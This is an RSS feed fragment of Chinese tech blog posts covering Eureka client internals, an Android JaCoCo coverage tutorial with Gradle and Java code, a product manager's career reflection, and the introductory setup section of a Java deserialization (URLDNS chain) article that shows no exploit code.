&lt;p&gt;　　该方法里面reg.getApplicationInfoManager().setInstanceStatus(reg.getInstanceConfig().getInitialStatus());触发状态变化监听器的notify方法，也就是调用到了ApplicationInfoManager.StatusChangeListener.notify方法，notify方法里面执行instanceInfoRep licator.onDemandUpdate()方法，最终调用InstanceInfoReplicator.this.run()方法，进行服务注册。&lt;/p&gt;
&lt;h2&gt;三、Eureka客户端流程图&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1761778/202010/1761778-20201005234330767-1134298131.jpg&quot; alt=&quot;&quot; width=&quot;1121&quot; height=&quot;1365&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　自此Eureka客户端源码解析完成，Eureka服务端源码详见：&lt;strong&gt;&lt;span&gt;&lt;a href=&quot;https://www.cnblogs.com/toby-xu/p/13770595.html&quot; target=&quot;_blank&quot;&gt;&lt;span&gt;Spring Cloud系列（三）：Eureka源码解析之服务端&lt;/span&gt;&lt;/a&gt;&lt;/span&gt;&lt;/strong&gt;。Eureka应用详见：&lt;strong&gt;&lt;a href=&quot;https://www.cnblogs.com/toby-xu/p/13757333.html&quot; target=&quot;_blank&quot;&gt;&lt;span&gt;Spring Cloud系列（二）：Eureka应用详&lt;/span&gt;&lt;span&gt;解&lt;/span&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
</description>
<pubDate>Mon, 05 Oct 2020 23:36:00 +0000</pubDate>
<dc:creator>toby.xu</dc:creator>
<og:description>一、自动装配 1、根据自动装配原理（详见：Spring Boot系列（二）：Spring Boot自动装配原理解析），找到spring-cloud-netflix-eureka-client.jar的</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/toby-xu/p/13771607.html</dc:identifier>
</item>
<item>
<title>安卓app功能或自动化测试覆盖率统计（不用instrumentation启动app） - 北漂的雷子</title>
<link>http://www.cnblogs.com/leiziv5/p/13772511.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/leiziv5/p/13772511.html</guid>
<description>&lt;p&gt;   一文带你揭秘如何采取非instrumentation启动app，打造实时统计覆盖率，一键触发覆盖率测试报告。&lt;/p&gt;
&lt;hr/&gt;
&lt;p&gt;　　在上篇文章，&lt;a href=&quot;http://mp.weixin.qq.com/s?__biz=MzI2NTU4OTI1NQ==&amp;amp;mid=2247485202&amp;amp;idx=1&amp;amp;sn=b30d78cc48339d18164742c481d60b0d&amp;amp;chksm=ea9a407addedc96c4522406e6108de04073cde89847eba02cc6d43f628bd4a03f01f512b7a3c&amp;amp;scene=21#wechat_redirect&quot; target=&quot;_blank&quot; data-itemshowtype=&quot;0&quot; data-linktype=&quot;2&quot;&gt;一文带你解决Android app手工测试或者自动化测试覆盖率统计（撸代码版）&lt;/a&gt;，我们采用了instrumentation的方式去启动app，很多人会问，如果我们不用instrumentation启动app的方式，正常启动app进行测试，然后收集覆盖率可以吗，答案，是可以的，如何做呢，下面带你去揭晓其中的奥秘。&lt;/p&gt;
&lt;p&gt;        首先呢，我们还是基于我们的工作，去申请我们的读写的权限。&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;33&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
&amp;lt;uses-permission android:name=&quot;android.permission.READ_EXTERNAL_STORAGE&quot; /&amp;gt;
    &amp;lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot; /&amp;gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;申请后，我们在安装app的时候一定要给予这两个权限，接下来呢，我们去配置jacoco相关的。&lt;/p&gt;
&lt;p&gt;在项目的build.gradle配置相关的，如下配置&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;33&quot;&gt;
&lt;pre class=&quot;brush:java;gutter:true;&quot;&gt;
apply plugin: 'jacoco'
jacoco {    
toolVersion = &quot;0.8.4&quot;    
description(&quot;$buildDir/coverage.exec&quot;)   
 reportsDir = file(&quot;$buildDir/reports/jacoco&quot;)
}
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;        首先我们去添加jacoco的插件，接着呢，我们去规定版本，然后去规定我们的覆盖文件的位置，接下来我们去告知下测试报告的位置。这样我们配置好了依赖，我们需要在debug打开覆盖率。还是同一个的build.gradle配置&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;35&quot;&gt;
&lt;pre class=&quot;brush:java;gutter:true;&quot;&gt;
 debug {           &lt;br/&gt;/**打开覆盖率统计开关*/            &lt;br/&gt;testCoverageEnabled = true            &lt;br/&gt;minifyEnabled false //获取代码覆盖率需要设为false            &lt;br/&gt;proguardFiles getDefaultProguardFile('proguard-android.txt'), 'proguard-rules.pro'        }
&lt;/pre&gt;&lt;/div&gt;

&lt;pre class=&quot;code-snippet__js&quot; data-lang=&quot;javascript&quot;&gt;
&lt;span&gt;配置完毕后呢，我们去编写一个jacoco的工具类，用来处理覆盖率文件的写入。具体代码如下&lt;/span&gt;
&lt;/pre&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;42&quot;&gt;
&lt;pre class=&quot;brush:java;gutter:true;&quot;&gt;
package com.example.studayapp.test;

import android.content.Context;
import android.os.Environment;
import android.util.Log;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;

public class JacocoUtils {
    static String TAG = &quot;JacocoUtils&quot;;

    private static String DEFAULT_COVERAGE_FILE_PATH = &quot;coverage.exec&quot;;

    /**
     * 生成ec文件
     *
     * @param isnew 是否重新创建exec文件
     */
    public static void generateEcFile(boolean isnew) {
        Log.d(TAG, &quot;生成覆盖率文件: &quot; + DEFAULT_COVERAGE_FILE_PATH);
        OutputStream out = null;
        File mCoverageFilePath = new File(Environment.getExternalStorageDirectory(),DEFAULT_COVERAGE_FILE_PATH);

        try {
            if (isnew &amp;amp;&amp;amp; mCoverageFilePath.exists()) {
                Log.d(TAG, &quot;清除旧的exec文件&quot;);
                mCoverageFilePath.delete();
            }
            if (!mCoverageFilePath.exists()) {
                mCoverageFilePath.createNewFile();
            }
            out = new FileOutputStream(mCoverageFilePath.getPath(), true);

            //反射：获取org.jacoco.agent.rt.IAgent
            Object agent = Class.forName(&quot;org.jacoco.agent.rt.RT&quot;)
                    .getMethod(&quot;getAgent&quot;)
                    .invoke(null);

            //反射：getExecutionData(boolean reset)，获取当前执行数据，
            // 以jacoco二进制格式转储当前执行数据
            // getExecutionData(boolean reset)，reset如果为true，则之后清除当前执行数据
            out.write((byte[]) agent.getClass().getMethod(&quot;getExecutionData&quot;, boolean.class)
                    .invoke(agent, false));

        } catch (Exception e) {
            Log.e(TAG, &quot;generateEcFile: &quot; + e.getMessage());
        } finally {
            if (out == null)
                return;
            try {
                out.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}
&lt;/pre&gt;&lt;/div&gt;

&lt;pre class=&quot;code-snippet__js&quot; data-lang=&quot;typescript&quot;&gt;
&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;&lt;br/&gt;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;        我们通过反射：获取org.jacoco.agent.rt.IAgent，然后，反射：getExecutionData(boolean reset)，获取当前执行数据，最后写入执行的数据。&lt;/p&gt;
&lt;p&gt;        这样我们收集的数据的脚本下好呢，那么我们应该怎么去收集我们的数据呢，之前的文章是通过系统的返回键后去生成的，这样呢，其实在我们实际的工作中呢，是不常见呢，很多的时候呢，我们需要在特定的时候才去触发呢，这里呢，我的做法呢，是在设置中，增加一个按钮，生成测试覆盖率的 按钮来统一处理。&lt;/p&gt;

&lt;pre class=&quot;code-snippet__js&quot; data-lang=&quot;xml&quot;&gt;
&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;&lt;span class=&quot;code-snippet__tag&quot;&gt;&amp;lt;&lt;span class=&quot;code-snippet__name&quot;&gt;Button&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                    &lt;br/&gt;&lt;span class=&quot;code-snippet__attr&quot;&gt;android:id=&lt;span class=&quot;code-snippet__string&quot;&gt;&quot;@+id/statistics&quot;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                    &lt;span class=&quot;code-snippet__attr&quot;&gt;android:layout_width=&lt;span class=&quot;code-snippet__string&quot;&gt;&quot;match_parent&quot;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                    &lt;span class=&quot;code-snippet__attr&quot;&gt;android:layout_height=&lt;span class=&quot;code-snippet__string&quot;&gt;&quot;wrap_content&quot;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                    &lt;span class=&quot;code-snippet__attr&quot;&gt;android:text=&lt;span class=&quot;code-snippet__string&quot;&gt;&quot;统计覆盖率&quot;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;&lt;br/&gt;&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                &lt;span class=&quot;code-snippet__tag&quot;&gt;&amp;lt;/&lt;span class=&quot;code-snippet__name&quot;&gt;Button&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;          在布局文件呢，我们去创建一个按钮，然后呢，我们去在这个按钮去监听点击事件。&lt;/p&gt;

&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;33&quot;&gt;
&lt;pre class=&quot;brush:java;gutter:true;&quot;&gt;
statistics=(Button) findViewById(R.id.statistics);
        statistics.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                JacocoUtils.generateEcFile(true);
            }
        });
&lt;/pre&gt;&lt;/div&gt;

&lt;pre class=&quot;code-snippet__js&quot; data-lang=&quot;java&quot;&gt;
&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    这样呢，我们去安装我们的app的debug版本&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/920110/202010/920110-20201006072842547-2010549419.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;

&lt;p&gt;    然后呢，我们去正常测试，最后呢，我们去点击我们的按钮。生成完毕后，如下。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/920110/202010/920110-20201006072901742-110713018.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;



&lt;p&gt;我们去在项目的目录下，我们去pull下来即可。&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:java;gutter:true;&quot;&gt;
adb pull /sdcard/coverage.exec .
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　   然后，我们在build.gradle创建一个任务。&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;40&quot;&gt;
&lt;pre class=&quot;brush:java;gutter:true;&quot;&gt;
def coverageSourceDirs = [
        '../app/src/main/java'
]
task jacocoTestReport(type: JacocoReport) {
    group = &quot;Reporting&quot;
    description = &quot;Generate Jacoco coverage reports after running tests.&quot;
    reports {
        xml.enabled = true
        html.enabled = true
    }
    classDirectories = fileTree(
            dir: './build/intermediates/javac/debug/classes',
            excludes: ['**/R*.class',

                       '**/*$InjectAdapter.class',
                       '**/*$ModuleAdapter.class',
                       '**/*$ViewInjector*.class'
            ])
    sourceDirectories = files(coverageSourceDirs)
    executionData = files(&quot;$buildDir/coverage.exec&quot;)

    doFirst {
        new File(&quot;$buildDir/intermediates/javac/debug/classes/&quot;).eachFileRecurse { file -&amp;gt;
            if (file.name.contains('$$')) {
                file.renameTo(file.path.replace('$$', '$'))
            }
        }
    }
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　然后点击&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/920110/202010/920110-20201006072955717-242257558.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;



&lt;p&gt;执行完毕后。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/920110/202010/920110-20201006073015752-938204879.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;



&lt;p&gt;我们看下实际的效果&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/920110/202010/920110-20201006073028367-1389953387.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;



&lt;p&gt;可以看到有测试报告，我们打开看下。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/920110/202010/920110-20201006073036715-1409475682.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;



&lt;p&gt;这是最后的覆盖率测试的统计数据。&lt;/p&gt;

&lt;p&gt;        这里的数据呢，只是统计到了全量代码的，还有增量代码覆盖率统计，多个覆盖率文件的不同的如何进行组合。后续的文章会持续分享。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/920110/202010/920110-20201006073057349-3481482.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;



&lt;pre class=&quot;code-snippet__js&quot; data-lang=&quot;java&quot;&gt;
&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt; &lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;</description>
<pubDate>Mon, 05 Oct 2020 23:34:00 +0000</pubDate>
<dc:creator>北漂的雷子</dc:creator>
<og:description>一文带你揭秘如何采取非instrumentation启动app，打造实时统计覆盖率，一键触发覆盖率测试报告。 在上篇文章，一文带你解决Android app手工测试或者自动化测试覆盖率统计（撸代码版）</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/leiziv5/p/13772511.html</dc:identifier>
</item>
<item>
<title>2020年元气满满|木深做产品一周年啦 - 木深</title>
<link>http://www.cnblogs.com/sam-zhang/p/13772329.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/sam-zhang/p/13772329.html</guid>
<description>&lt;p&gt;&lt;img src=&quot;https://img.pmcaff.com/FoXL1mvSRAVBx6fwRmE-IfHttWzG-picture&quot; alt=&quot;1蹲着笑.jpg&quot; width=&quot;920&quot; height=&quot;614&quot;/&gt;&lt;img src=&quot;https://img.pmcaff.com/FsUtW_AMSTogpHtzr9YD7IMuVHKy-picture&quot; alt=&quot;5开心翘脚.jpg&quot; width=&quot;920&quot; height=&quot;614&quot;/&gt;&lt;img src=&quot;https://img.pmcaff.com/FiY2tiWZDselZHHGOdzfWPAjgmOP-picture&quot; alt=&quot;6橱窗里.jpg&quot; width=&quot;920&quot; height=&quot;1200&quot;/&gt;&lt;/p&gt;

&lt;p&gt;万事开头难，踏入社会的这第一年里，可真是辛苦你了呢。同时呢我也很好奇，你究竟是怎样从一个普通的二本学生，变成了上市公司的产品经理，可以请你讲给我听吗？或许你的分享可以帮助到，那些和你同样是“非985、211”的普通大学生们入门产品并且快速过渡。&lt;/p&gt;
&lt;p&gt;好，现在根据STAR法则，得出：S-双非学生，T-从入门到进阶，A-？，R-上市公司产品经理。这里面A，主要会拆解成“入门”和“进阶”两个部分细说。&lt;/p&gt;

&lt;p&gt;入门是最难的一步，我念的学校没有产品经理专业，所以不存在对口这一说法，自然相比于从事本专业来讲，选择一毕业就做产品岗位是最难的。这里我会先介绍产品岗位本身的“围城”，再接着聊咱们面对这个围城的“挑战和机遇”。&lt;/p&gt;
&lt;h2&gt;围城&lt;/h2&gt;
&lt;p&gt;你一定听过“人人都是产品经理”，就是这句话造就了产品经理的围城。这话出自于苏杰曾经的观点，他是浙江大学硕士，2006年毕业加入阿里做产品，四年的沉淀让他在2020年一举封神，出版了“人人都是产品经理”一书。&lt;/p&gt;
&lt;p&gt;越来越多的人，甚至没看过这本书，光听到这个书名就跑进围城做产品了。10年的时间里，产品的围城真就是挤满了人。所以，本来“啥都不会就可以做的产品”，他就慢慢的内卷了，逐渐地淘汰掉裸泳的小猪仔。这时候，入城的门槛也就越来越高，随之而来的就是入行的巨大挑战！&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img.pmcaff.com/FussUgiMSVYx5rdXL6GJU6oKtJ8j-picture&quot; alt=&quot;1人人都是产品经理.jpg&quot; width=&quot;493&quot; height=&quot;700&quot;/&gt;&lt;/p&gt;
&lt;h2&gt;挑战&lt;/h2&gt;
&lt;p&gt;胜算不足100分的事情，我喜欢称它为挑战。在入门产品经理的这件事上，对于双非的我来讲，胜算极低！原因有三：1.卡学历 2.卡经验 3.卡机遇&lt;/p&gt;
&lt;p&gt;学历、经验、机遇是三座大山，直接压碎了属于学生时代的幻想。换位思考，你作为腾讯、阿里、百度的人事，只需要轻轻点一下“学历”的筛选按钮，就可以从每天上百份简历中解放出来，付出的代价却仅仅是粉碎了陌生人不切实际的梦想而已嘛。所以认怂是我的第一个转折点，拒绝死磕大厂。（其实这一步挺难的，谁愿意承认自己的失败呢。更何况，同学去了腾讯、头条和百度，向他们服输真痛苦）&lt;/p&gt;
&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td rowspan=&quot;1&quot; colspan=&quot;4&quot;&gt;深圳的互联网大厂&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;百度&lt;/td&gt;
&lt;td&gt;腾讯&lt;/td&gt;
&lt;td&gt;华为&lt;/td&gt;
&lt;td&gt;中兴&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;迅雷&lt;/td&gt;
&lt;td&gt;大疆&lt;/td&gt;
&lt;td&gt;微软&lt;/td&gt;
&lt;td&gt;深信服&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;TCL&lt;/td&gt;
&lt;td&gt;OPPO&lt;/td&gt;
&lt;td&gt;平安科技&lt;/td&gt;
&lt;td&gt;顺丰&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;珍爱网&lt;/td&gt;
&lt;td&gt;魅族&lt;/td&gt;
&lt;td&gt;房多多&lt;/td&gt;
&lt;td&gt;ZAKER&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;VIVO&lt;/td&gt;
&lt;td&gt;金立&lt;/td&gt;
&lt;td&gt;OPPO&lt;/td&gt;
&lt;td&gt;创新工场&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;吉比特&lt;/td&gt;
&lt;td&gt;土巴兔&lt;/td&gt;
&lt;td&gt;本地宝&lt;/td&gt;
&lt;td&gt;无觅阅读&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;h2&gt;机遇&lt;/h2&gt;
&lt;p&gt;机遇在我这里是个是个中性词，它区分开了两种人。弱者，只会抱怨“命”不好；强者，总是说“运气”好。截然不同的命运，都怪这个机遇罢。&lt;/p&gt;
&lt;p&gt;在求职这件事的机遇把握上，我主要做了“拒绝海投”和“海投”两件事。对于大厂得拒绝海投，根据背景、职责和其他因素定制简历专项投递。此外，请海投，多一份曝光就多一份希望。&lt;/p&gt;
&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;校招&lt;/td&gt;
&lt;td&gt;社招&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;牛客网&lt;/td&gt;
&lt;td&gt;BOSS&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;大街网&lt;/td&gt;
&lt;td&gt;拉勾&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;应届生求职网&lt;/td&gt;
&lt;td&gt;前程无忧&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;机遇是个神奇的事，在能力相近的情况下。多投递会更有优势，但是也会有有意思的事发生。记得有个实习生来我们公司面试挂了，结果我在牛客网看到了这同学的帖子，说：生活真魔幻，上午面试我们公司被吊打，居然下午面试阿里大文娱过了。我整个人都不好了。后来同事跳槽去了头条，又留下我一个人反思自己。我很感谢他们，给我种下了一颗“投机”的种子，我一直坚持在做。一年时间，沟通过近4000岗位，投递过600+岗位，是这些坚持让机遇的种子开出了花儿。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img.pmcaff.com/FvqDaNAD2cN4v2VR5N5Ko52dawUB-picture&quot; alt=&quot;2BOSS沟通.jpg&quot; width=&quot;1079&quot; height=&quot;1200&quot;/&gt;&lt;/p&gt;
&lt;p&gt;每一朵花儿，都有它绽放的理由。产品人心中的花儿，往往是伴随着持续的热情投入才会有回报，在没有得到相应回报的那段煎熬日子里，你努力过的痕迹就是你坚实的后盾！&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img.pmcaff.com/Fi7fit2h4fg_V71goRI236fWzUjf-picture&quot; alt=&quot;2风扇旁笑.jpg&quot; width=&quot;920&quot; height=&quot;614&quot;/&gt;&lt;/p&gt;

&lt;p&gt;入门的一年我超勇的，早上九点上班晚上11点下班一周6天，现在回想起来觉得自己真是个“敢敢”（憨憨的还碎了心）。&lt;/p&gt;
&lt;h2&gt;煮青蛙&lt;/h2&gt;
&lt;p&gt;好不容易得到的产品助理机会，我真的是把他捧在手心里了。害怕被嫌弃，11点下班后还疯狂的全网查漏补缺，基本上是2点睡8点起来上班，真不知道为啥不会困，或许是一种透支吧。工作的时候但凡安排给我的活，大多都是按照人人、PMcaff等社区的最优方案去执行任务（竞品分析、需求调研、原型设计、跟进BUG、测试验收）。甚至周末/国庆/过年我都呆在公司，真就是乐此不疲的感觉。不过只是害怕被嫌弃，而拼命守护住这个来之不易的机会而已。&lt;/p&gt;
&lt;p&gt;对于当时的我来说，丝毫意识不到这是开水煮青蛙，反而乐在其中。安心当需求传话筒、画图仔、打杂。这是一件可怕的事情，我逐渐意识到了，入门只是开始，好戏还在后面。&lt;/p&gt;
&lt;h2&gt;烫着了&lt;/h2&gt;
&lt;p&gt;忽的一天，我发现自己已经沦为了需求传话筒、画图仔，这不就是定制化的奴隶嘛，根本就不是改变世界的产品经理。&lt;/p&gt;
&lt;p&gt;所以带着“产品经理到底该是怎样的”这个疑惑，我拜访了许多老师。答案当然是众说纷纭的，毕竟他们做不到和我感同身受，更不会知道，一句话对我的影响力有多大。&lt;/p&gt;
&lt;p&gt;最终，我认为阿里的一位老师讲的靠谱，他说：做产品是“点线面体”的过程。先从一个点开始做，直到独当一面甚至负责一个体系/生态。&lt;/p&gt;
&lt;h2&gt;跳出去&lt;/h2&gt;
&lt;p&gt;产品经理岗位的初级和中级，一定不是机械重复劳作就可以晋升的。产品经理应该是出谋划策的智囊团，而不是具体方案的实施者和落地者。那么怎么成为智囊团呢？&lt;/p&gt;
&lt;p&gt;需要突破，突破点在需求的来源上。需求三大来源：用户反馈、数据分析、战略方向。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;用户反馈这事，不应该是用户反应啥就做啥，而是通过深挖“用户为啥想要最快的马”，得到核心诉求“想要快”，从而给到“汽车”这样的一个解决方案。&lt;/li&gt;
&lt;li&gt;数据分析这事，不应该是被动式响应（跌了着急，涨了不急），而是主动的折腾数据优化模型不断地再机械的被动响应外，降低分析成本或者提升效率。&lt;/li&gt;
&lt;li&gt;战略方向这事，就先不提了，因为更深层次的资源是目前我所不具备的，仅给到观点没有用处，需要带资进组，也就是在没有人辅助的情况下，自己能为这个idea负责。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;感谢，第一份工作中，全力以赴的自己。我成为了有一定影响力的产品人。&lt;/p&gt;
&lt;p&gt;CSDN社区-研发管理类-博客专家（五年时间）；PMcaff社区-专栏作者（一年时间）。其他博客园、知乎、简书、人人、产品壹佰等等就不多说啦&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img.pmcaff.com/Fosh1EpVVPmb8P_pQXDiu103Q4b0-picture&quot; alt=&quot;pmcafe.png&quot; width=&quot;1200&quot; height=&quot;599&quot;/&gt;&lt;img src=&quot;https://img.pmcaff.com/FuNxwhdq1IEnUax1yBkjg4to0-hQ-picture&quot; alt=&quot;博客.png&quot; width=&quot;721&quot; height=&quot;548&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;一个国家最好看的风景，就是这个国家的年轻人。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;无需活成别人想象中的样子，因为任何人的想象力，都不足以想象我们的未来。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img.pmcaff.com/Fj46q1u8gSbcJFDkHA1hqKbWsfYf-picture&quot; alt=&quot;3脸部特写.jpg&quot; width=&quot;920&quot; height=&quot;614&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Mon, 05 Oct 2020 21:01:00 +0000</pubDate>
<dc:creator>木深</dc:creator>
<og:description>万事开头难，踏入社会的这第一年里，可真是辛苦你了呢。同时呢我也很好奇，你究竟是怎样从一个普通的二本学生，变成了上市公司的产品经理，可以请你讲给我听吗？或许你的分享可以帮助到，那些和你同样是“非985、</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/sam-zhang/p/13772329.html</dc:identifier>
</item>
<item>
<title>Java安全之URLDNS链 - nice_0e3</title>
<link>http://www.cnblogs.com/nice0e3/p/13772184.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/nice0e3/p/13772184.html</guid>
<description>&lt;h2 id=&quot;0x00-前言&quot;&gt;0x00 前言&lt;/h2&gt;
&lt;p&gt;在学习Java的反序列化漏洞的时候，就不得不学习他的一个利用链。很多刚刚入门的对于利用链这个词可能比较陌生。那么这里先来了解一下Java反序列化和反序列化漏洞的一个产生。&lt;/p&gt;
&lt;p&gt;文章首发：&lt;a href=&quot;https://www.t00ls.net/thread-58172-1-1.html&quot;&gt;Java安全之URLDNS链&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x01-java反序列化&quot;&gt;0x01 Java反序列化&lt;/h2&gt;
&lt;p&gt;Java提供了一种对象序列化的机制，用一个字节序列表示一个对象，该字节包含对象的数据、对象的类型、对象的存储属性。字节序列写出到文件后，相当于可以持久报错了一个对象信息，这过程叫做序列化。序列化对象会通过&lt;code&gt;ObjectOutputStream&lt;/code&gt; 的&lt;code&gt;writeObject&lt;/code&gt;方法将一个对象写入到文件中。&lt;/p&gt;
&lt;p&gt;而反序列化是使用了&lt;code&gt;readObject&lt;/code&gt; 方法进行读取并还原成在序列化前的一个类。&lt;/p&gt;
&lt;p&gt;这一步骤并没有什么安全问题，但是如果反序列化的数据是可控的情况下，那么我们就可以从某个输入点，输入恶意代码，再去查找在哪个点，我们的输入会被一层一层的带去到我们的触发点去，而这一步叫做寻找利用链的步骤。&lt;/p&gt;
&lt;h2 id=&quot;0x02-动态调试ysoserial&quot;&gt;0x02 动态调试ysoserial&lt;/h2&gt;
&lt;p&gt;至于ysoserial就不多叙述了，自行百度。&lt;/p&gt;
&lt;p&gt;ysoserial项目地址：&lt;a href=&quot;https://github.com/frohoff/ysoserial&quot;&gt;ysoserial&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;拉取项目源码，导入到IDEA中。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1993669/202009/1993669-20200926224228643-351391102.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;看到pom.xml知道该项目是个maven的项目，点击pom.xml 进行刷新，将缺少的依赖给下载下来&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1993669/202009/1993669-20200926224237210-940348616.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;下载完成，直到不爆红了后，就可以开始调试ysoserial了。&lt;/p&gt;
&lt;p&gt;先来查找一下该程序的入口点，点开pom.xml搜索mainclass就可以找到入口点的类&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1993669/202009/1993669-20200926224249732-1271204792.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;ctrl+左键点击跟踪进去，运行测试一下。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1993669/202009/1993669-20200926224300595-2135607337.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1993669/202009/1993669-20200926224310150-953694183.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;运行发现爆了一些错误，这里是因为我们并没有去传入值。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1993669/202009/1993669-20200926224320026-1892883785.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
